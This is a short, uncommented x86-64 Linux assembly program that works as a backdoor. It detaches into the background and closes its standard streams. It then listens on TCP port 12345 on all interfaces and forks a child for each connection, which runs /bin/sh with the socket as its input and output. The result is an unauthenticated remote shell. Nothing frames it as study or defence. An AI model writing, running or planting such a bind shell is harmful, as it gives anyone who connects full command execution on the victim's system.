section .bss
    sock_fd resb 4
    addr resb 16

section .text
    global _start

_start:
    mov eax, 57
    syscall
    test eax, eax
    jne  exit_process

    mov eax, 112
    syscall

    xor edi, edi
    mov eax, 3
    syscall
    mov edi, 1
    syscall
    mov edi, 2
    syscall

    mov eax, 41
    mov edi, 2
    mov esi, 1
    syscall
    mov [sock_fd], eax

    xor rax, rax
    mov word [addr], 0x2
    mov word [addr+2], 0x3930
    mov dword [addr+4], 0
    mov eax, 49
    mov edi, [sock_fd]
    mov esi, addr
    mov edx, 16
    syscall

    mov eax, 50
    mov edi, [sock_fd]
    xor esi, esi
    syscall

listen_loop:

    mov eax, 43
    mov edi, [sock_fd]
    xor esi, esi
    xor edx, edx
    syscall

    mov ebx, eax
    mov eax, 57
    syscall
    test eax, eax
    jz   handle_connection
    jmp  listen_loop

handle_connection:

    mov edi, ebx

    mov esi, 0
    call dup2_socket
    mov esi, 1
    call dup2_socket
    mov esi, 2
    call dup2_socket

    mov eax, 59
    mov rdi, shell
    xor esi, esi
    xor edx, edx
    syscall

    mov eax, 60
    xor edi, edi
    syscall

dup2_socket:
    mov eax, 33
    syscall
    ret

exit_process:
    mov eax, 60
    xor edi, edi
    syscall

section .data
    shell db '/bin/sh', 0